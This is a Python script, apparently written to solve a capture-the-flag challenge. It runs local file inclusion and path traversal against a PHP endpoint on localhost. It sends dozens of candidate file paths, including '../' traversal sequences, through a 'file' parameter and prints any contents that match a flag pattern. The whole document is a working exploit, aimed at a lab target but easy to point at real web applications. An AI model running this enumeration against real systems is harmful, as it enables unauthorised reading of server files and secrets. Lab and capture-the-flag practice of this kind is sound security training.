import requests
import re

# Target configuration
target_url = "http://127.0.0.1:33001/private.php"

# Common flag file locations to test
flag_paths = [
    "/flag",
    "/flag.txt",
    "/home/user/flag",
    "/home/user/flag.txt",
    "/home/www-data/flag",
    "/home/www-data/flag.txt",
    "/opt/flag",
    "/opt/flag.txt",
    "/root/flag",
    "/root/flag.txt",
    "/var/flag",
    "/var/flag.txt",
    "/tmp/flag",
    "/tmp/flag.txt",
    "/etc/flag",
    "/etc/flag.txt",
    "/flag.php",
    "/var/www/flag",
    "/var/www/html/flag",
    "/var/www/html/flag.txt",
    "/app/flag",
    "/app/flag.txt",
    "flag",
    "flag.txt",
    "/secrets/flag",
    "/secrets/flag.txt",
    "../../../flag",
    "../../../flag.txt",
    "../../../../flag",
    "../../../../flag.txt",
    "../../../../../../flag",
    "../../../../../../flag.txt"
]

print("[*] Starting LFI flag file enumeration")
print(f"[*] Target: {target_url}")
print(f"[*] Testing {len(flag_paths)} potential flag locations")
print()

found_flags = []
successful_files = []
blocked_files = []

for flag_path in flag_paths:
    try:
        # Make request with the file path
        response = requests.get(target_url, params={"file": flag_path}, timeout=5)
        
        # Check for flag pattern in response
        if re.search(r'FLAG\{[^}]*\}', response.text, re.IGNORECASE):
            # FLAG found!
            print(f"[!!!] FLAG FOUND in: {flag_path}")
            print(f"      Status: {response.status_code}")
            print(f"      Response:\n{response.text}")
            found_flags.append((flag_path, response.text))
        
        # Check if file exists (not empty and not a permission denied error)
        elif response.status_code == 200 and len(response.text) > 0:
            # Check if it's not a "Permission denied" or similar error
            if "permission denied" not in response.text.lower() and "no such file" not in response.text.lower() and "cannot open" not in response.text.lower():
                print(f"[+] File exists: {flag_path}")
                print(f"    Status: {response.status_code} | Length: {len(response.text)}")
                print(f"    Content:\n{response.text[:500]}")
                if len(response.text) > 500:
                    print(f"    ... ({len(response.text) - 500} more characters)")
                successful_files.append((flag_path, response.text))
            else:
                print(f"[-] Permission denied or missing: {flag_path}")
                blocked_files.append((flag_path, response.text[:200]))
        elif response.status_code == 403:
            print(f"[-] Access denied (403): {flag_path}")
            blocked_files.append((flag_path, response.text[:200]))
        elif response.status_code == 404:
            print(f"[-] Not found (404): {flag_path}")
        else:
            print(f"[?] Status {response.status_code}: {flag_path}")
            
    except requests.exceptions.Timeout:
        print(f"[!] Timeout: {flag_path}")
    except Exception as e:
        print(f"[!] Error testing {flag_path}: {str(e)}")

print()
print("=" * 60)
print("[SUMMARY]")
print(f"[*] Files found and readable: {len(successful_files)}")
print(f"[*] Files blocked/error: {len(blocked_files)}")
print(f"[*] FLAGS found: {len(found_flags)}")

if found_flags:
    print()
    print("[!] FLAGS DISCOVERED:")
    for path, content in found_flags:
        print(f"    Path: {path}")
        # Extract and print just the flag pattern
        flags = re.findall(r'FLAG\{[^}]*\}', content, re.IGNORECASE)
        for flag in flags:
            print(f"    Flag: {flag}")

if successful_files and not found_flags:
    print()
    print("[+] Files successfully read (no flags found):")
    for path, content in successful_files:
        print(f"    - {path} ({len(content)} bytes)")
